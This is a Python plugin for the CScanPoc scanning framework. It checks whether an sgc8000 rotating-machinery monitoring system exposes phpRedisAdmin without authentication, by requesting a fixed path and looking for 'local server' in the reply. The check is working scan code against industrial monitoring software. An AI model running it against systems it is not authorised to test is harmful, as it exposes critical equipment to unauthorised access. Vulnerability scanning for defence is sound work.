# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'sgc8000_0008'  # 平台漏洞编号，留空
    name = 'sgc8000 大型旋转机监控系统 phpRedisAdmin未授权访问'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2015-10-05'  # 漏洞公布时间
    desc = '''
        sgc8000 大型旋转机监控系统 phpRedisAdmin未授权访问
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=0135197
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'sgc8000'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'bc3eb0f6-a481-4382-98f8-8a0cb760fa72'
    author = '国光'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            p = "/phpredisadmin/?import&s=0"
            url = arg + p
            code2, head, res, errcode, _ = hh.http(url)
            if (code2 == 200) and ('local server' in res):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
